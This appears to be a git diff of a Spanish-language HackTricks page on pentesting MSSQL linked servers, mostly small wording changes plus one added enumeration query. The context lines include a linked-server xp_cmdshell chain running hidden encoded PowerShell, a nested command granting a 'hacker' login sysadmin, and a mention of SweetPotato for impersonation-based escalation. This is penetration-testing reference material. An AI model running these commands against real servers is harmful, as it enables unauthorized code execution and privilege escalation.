@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
@@ -133,10 +133,9 @@ Desde **Windows** también podrías encontrar los enlaces y ejecutar comandos ma
 _Iniciar sesión usando autenticación de Windows:_
 
 ![](<../../.gitbook/assets/image (167) (1).png>)
-
-#### Encontrar Enlaces Confiables
 ```sql
-select * from master..sysservers
+select * from master..sysservers;
+EXEC sp_linkedservers;
 ```
 ![](<../../.gitbook/assets/image (168).png>)
 
@@ -152,7 +151,7 @@ Verifica dónde se utilizan comillas dobles y simples, es importante usarlas de 
 
 ![](<../../.gitbook/assets/image (169).png>)
 
-Puedes continuar esta cadena de enlaces de confianza para siempre de forma manual.
+Puedes continuar esta cadena de enlaces confiables para siempre de forma manual.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -172,6 +171,6 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 El usuario local de **MSSQL** generalmente tiene un tipo especial de privilegio llamado **`SeImpersonatePrivilege`**. Esto permite que la cuenta "suplante a un cliente después de la autenticación".
 
-Una estrategia que muchos autores han ideado es forzar a un servicio **SYSTEM** a autenticarse en un servicio falso o de intermediario que el atacante crea. Este servicio falso puede entonces suplantar al servicio **SYSTEM** mientras intenta autenticarse.
+Una estrategia que muchos autores han ideado es forzar a un servicio **SYSTEM** a autenticarse en un servicio falso o de intermediario creado por el atacante. Este servicio falso puede entonces suplantar al servicio **SYSTEM** mientras intenta autenticarse.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) tiene una colección de estas diversas técnicas que pueden ejecutarse a través del comando `execute-assembly` de Beacon.
